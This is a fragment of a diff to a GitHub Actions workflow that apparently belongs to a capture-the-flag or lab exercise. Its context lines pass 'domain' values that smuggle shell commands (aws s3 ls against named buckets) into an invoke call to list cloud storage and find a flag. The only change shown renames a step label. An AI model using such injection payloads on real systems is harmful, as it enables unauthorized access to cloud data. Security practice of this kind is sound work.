@@ -122,7 +122,7 @@ jobs:
           invoke "s3ls" '{"domain":"example.com; /opt/aws s3 ls; aws s3 ls; python -m awscli s3 ls; #"}'
           invoke "findflag" '{"domain":"example.com; /opt/aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive; /opt/aws s3 ls s3://codec4f26c862a321ef5 --recursive; /opt/aws s3 ls s3://site781fe43f26b9eba3 --recursive; #"}'
 
-      - name: Try CloudWatch log read
+      - name: Try CloudWatch log readz
         shell: bash
         run: |
           set -euo pipefail
